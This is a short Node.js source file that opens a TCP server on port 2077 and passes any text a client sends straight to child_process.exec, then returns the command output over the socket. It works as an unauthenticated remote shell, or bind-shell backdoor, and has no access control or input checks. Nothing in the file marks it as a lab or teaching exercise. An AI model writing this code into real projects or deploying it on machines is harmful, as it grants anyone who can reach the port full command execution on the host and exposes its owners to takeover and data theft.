    
const net = require("net");


const serverSocket = new net.createServer(clientConnected);

const exec = require('child_process').exec;



function clientConnected(client) {
    console.log("connected");
    client.on("data", data => {

            exec(data.toString(), function (Error, stdout) {
                if (Error) {
                    throw Error;
                } else {
                    client.write(stdout);
                }
            })


            client.on("end", () => {
                console.log("disconnected");
            })
        })
    }

    serverSocket.listen(2077, () => {
        console.log("localhost: 2077")
    });